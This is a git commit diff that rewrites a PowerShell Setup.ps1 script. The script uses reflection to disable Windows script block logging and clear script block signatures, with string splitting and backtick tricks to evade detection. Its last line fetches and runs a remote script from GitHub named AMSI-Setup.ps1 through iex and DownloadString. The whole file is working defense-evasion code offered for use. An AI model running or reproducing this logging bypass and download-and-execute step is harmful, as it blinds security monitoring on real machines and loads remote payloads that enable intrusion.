2943d0c9182e3b4d0255dba7426cf98c8f9a9cfa
b4rtik <andrea.ghelli@gmail.com>
2018-10-03 13:42:03 +0200

    Update Setup.ps1

--- Setup.ps1
+++ Setup.ps1
@@ -1,20 +1,28 @@
-
-Write-host " "
-$polocy = [Ref].Assembly.GetType("System.Management.Automation.Utils")."GetFie`ld"("cachedGroupPolicySettings","NonPu"+"blic,Static")
-if($polocy)
+try 
 {
-	$settings = $polocy.GetValue($null);
-	if($settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Scr'+'iptB'+'lockLo'+'gging'])
-	{
-		Write-host "Script block logging enabled"
-		Write-host " "
-		Write-host "Running script block logging bypass"
+	Write-host " "
+        $ErrorActionPreference = "SilentlyContinue";
+        $pathk = "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Scr"+"iptB"+"lockLo"+"gging"
+	
+	    $value = Get-ItemProperty -Path $pathk -erroraction SilentlyContinue | Select-Object -ExpandProperty "EnableSc"+"riptBlockLogging" 
+	    if($value -ne 1)
+        {
+            throw "Script block logging not enabled"
+        }
+	Write-host "Script block logging enabled"
+	Write-host " "
+	Write-host "Running script block logging bypass"
 
-		$settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Scr'+'iptB'+'lockLo'+'gging'] = @{}
-		$settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Scr'+'iptB'+'lockLo'+'gging'].Add('EnableScr'+'iptBlockLogging',"0")
-		$settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Scr'+'iptB'+'lockLo'+'gging'].Add('EnableScri'+'ptBlockInvoca'+'tionLogging',"0")
-		[Ref].Assembly.GetType("System.Management.Automation.ScriptBlock")."GetFie`ld"("signatures","NonPub"+"lic,static").SetValue($null, (New-Object 'System.Collections.Generic.HashSet[string]'))
-	}
+	$settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null);
+	$settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Scr'+'iptB'+'lockLo'+'gging'] = @{}
+	$settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Scr'+'iptB'+'lockLo'+'gging'].Add('EnableScr'+'iptBlockLogging',"0")
+	$settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Scr'+'iptB'+'lockLo'+'gging'].Add('EnableScri'+'ptBlockInvoca'+'tionLogging',"0")
+	[Ref].Assembly.GetType("System.Management.Automation.ScriptBlock")."GetFie`ld"("signatures","NonPub"+"lic,static").SetValue($null, (New-Object 'System.Collections.Generic.HashSet[string]'))
+
+}
+catch 
+{
+	    Write-host "Script block logging not enabled"
 }
 
 iex((New-Object system.net.WebClient).DownloadString('https://raw.githubusercontent.com/b4rtik/PowerTheShell/master/AMSI-Setup.ps1'))
